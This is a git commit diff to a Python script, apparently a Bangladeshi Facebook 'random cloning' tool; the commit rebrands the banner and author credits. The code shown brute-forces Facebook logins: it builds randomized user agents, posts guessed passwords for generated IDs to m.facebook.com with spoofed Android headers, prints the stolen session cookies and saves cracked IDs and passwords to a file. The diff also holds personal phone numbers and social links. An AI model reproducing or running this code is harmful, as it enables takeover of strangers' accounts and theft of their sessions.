046a615575dba6585371ccf33eb575603cad3c97
TEAM-UCA <125577927+TEAM-UCA@users.noreply.github.com>
2024-01-31 15:15:36 +0600

    Update mahadi.py

--- mahadi.py
+++ mahadi.py
@@ -21,7 +21,7 @@ try:
 except ImportError:
     print('\n [✓] installing requests !...\n')
     os.system('pip install requests')
-
+ 
 try:
     import concurrent.futures
 except ImportError:
@@ -38,8 +38,8 @@ import requests, os, re, bs4,platform, sys, json, time, random, datetime, subpro
 from concurrent.futures import ThreadPoolExecutor as ahmadAXI
 from datetime import datetime
 from bs4 import BeautifulSoup
-
-
+ 
+ 
 ct = datetime.now()
 n = ct.month
 bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
@@ -49,7 +49,7 @@ try:
     nTemp = n - 1
 except ValueError:
     exit()
-
+ 
 current = datetime.now()
 ta = current.year
 bu = current.month
@@ -109,41 +109,37 @@ for sat in range(1000):
 	l='.0'
 	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
 	ugen.append(uaku2)
-
+ 
 nka = [
 "NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
 "NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
 "nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
 ]
-
-
+ 
+ 
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.01)
-
+ 
   
-logo=(""" ABAL MAHADI OPEN SOURCH \033[1;37m
-\33[1;92m███    ███ \033[1;34m █████ \033[1;93m ██   ██\033[1;91m  █████\033[1;35m  ██████  \033[1;36m██
-\33[1;92m████  ████ \033[1;34m██   ██\033[1;93m ██   ██ \033[1;91m██   ██ \033[1;35m██   ██ \033[1;36m██
-\33[1;92m██ ████ ██\033[1;34m ███████\033[1;93m ███████\033[1;91m ███████ \033[1;35m██   ██ \033[1;36m██
-\33[1;92m██  ██  ██ \033[1;34m██   ██\033[1;93m ██   ██\033[1;91m ██   ██\033[1;35m ██   ██ \033[1;36m██
-\33[1;92m██      ██\033[1;34m ██   ██\033[1;93m ██   ██\033[1;91m ██   ██\033[1;35m ██████  \033[1;36m██     
-\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m TOR BAPER   TEAM NSN OPEN SURCH MARLO  \033[0;m  ║
-\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
-\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V15 \033[0;m    ║
-\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
-\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\33[1;92m║➣\033[1;91m DEVOLPER   :          MAHADI HASAN AFRIDI \33[1;92m║               
-\33[1;92m║➣ FACEBOOK   :          MAHADI HASAN AFRIDI \33[1;92m║                 
-\33[1;92m║➣\033[1;93m WHATSAPP   :          01794315166        \33[1;92m ║
-\33[1;92m║➣\033[1;34m GITHUB     :          MAHADI-143         \33[1;92m ║          
-\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m ║                 
-\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-""")
+logo=(""" \033[1;34mMR \033[1;37md8b   db  .d8b.  db    db d888888b .88b  d88. 
+       \033[1;37m888o  88 d8' `8b `8b  d8'   `88'   88'YbdP`88 
+       \033[1;37m88V8o 88 88ooo88  `8bd8'     88    88  88  88 
+       \033[1;37m88 V8o88 88~~~88    88       88    88  88  88 
+       \033[1;37m88  V888 88   88    88      .88.   88  88  88 
+       \033[1;37mVP   V8P YP   YP    YP    Y888888P YP  YP  YP \033[1;34m404
+\033[1;37m------------------------------------------------------------
+ \033[1;37m[\033[1;32m+\033[1;37m] AUTHOR    :  NAJMUL HOQUE NAYIM
+ \033[1;37m[\033[1;32m+\033[1;37m] FACEBOOK  :  TAWSHIF AHMED NAYIM 
+ \033[1;37m[\033[1;32m+\033[1;37m] GITHUB    :  \033[1;34mMR\033[1;31m-\033[1;37mNAYIM\033[1;31m-\033[1;34m404
+ \033[1;37m[\033[1;32m+\033[1;37m] STUTAS    :  F\033[1;34m|\033[1;37mR\033[1;34m|\033[1;37mE\033[1;34m|\033[1;37mE 
+ \033[1;37m[\033[1;32m+\033[1;37m] VERSION   :  \033[1;33m0.1.3  \x1b[38;5;46mRANDOM \033[1;37m
+\033[1;37m------------------------------------------------------------""")               
+def line():
+    print('\033[1;37m------------------------------------------------------------')
+    
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
 	sop = BeautifulSoup(w,"html.parser")
@@ -174,7 +170,7 @@ def Main():
 	print("[\033[1;37m03\33[1;92m][\033[1;93mC\33[1;92m] FOLLOW MY FB PROFILE")
 	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] JOIN MESSENGER GROUP")
 	print('[\033[1;37m00\33[1;92m][\033[1;93mE\33[1;92m] EXIT PROGRAMMING')
-	print(54*'━')
+	line()
 	opt = input('Choose option >>> ')
 	if opt in ["A","1"]:
 		virusA()
@@ -192,26 +188,7 @@ def Main():
 	else:
 		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
 		Main()
-def admin():
-	os.system('clear')
-	print(logo)
-	print(50*'_')
-	print(' [1] Contract WhatsApp ')
-	print(' [2] FOLLOW MY FB PAGE ')
-	print(' [3] Subscribe Youtube')
-	print(' [0] Back to Main menu')
-	bal = input('Choose option >>> ')
-	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801701707661');time.sleep(1)
-		admin()
-	if bal =='2':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=452360276797465');time.sleep(1)
-		admin()
-	if bal =='3':
-		os.system('xdg-open https://youtube.com/channel/UCRedHPu_qhEpO9aLttjRKrg');time.sleep(1)
-		admin()
-	if bal =='0':
-		Main()
+
 		
 def virusA():
 	user=[]
@@ -231,8 +208,7 @@ def virusA():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print('┏━[•] COUNTRY    : Bangladesh')
-		print('┣━[•] TOTAL ID   :  '+tl)
+		print('┏━[•] TOTAL ID   :  '+tl)
 		print(f'┣━[•] SIM CODE   : \033[1;92m {kode} ')
 		print('┗━[•] START BD UID MIXT CRACKING... ')
 		print(50*'━')
@@ -245,7 +221,7 @@ def virusA():
 	print(' [💉] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
-
+ 
 def b(uid,pwx,tl):
     global loop
     global cps    
@@ -254,7 +230,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJAHID\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mNAYIM\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -272,26 +248,31 @@ def b(uid,pwx,tl):
             header_freefb = {'authority': 'm.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '1.4375',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"V2111"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
+            'viewport-width': '980',
             'user-agent': pro}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [MAHADI-💚] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\033[1;92m=[💙]=COOKIE : '+coki)
+                print(f'\r\33[1;92m [MR-NAYIM-404] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\033[1;92mCOOKIE : '+coki)
                 oks.append(cid)
                 open('/sdcard/jahidok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
@@ -299,6 +280,6 @@ def b(uid,pwx,tl):
                 continue
         loop+=1        
     except:
-
+ 
         pass
 Main()
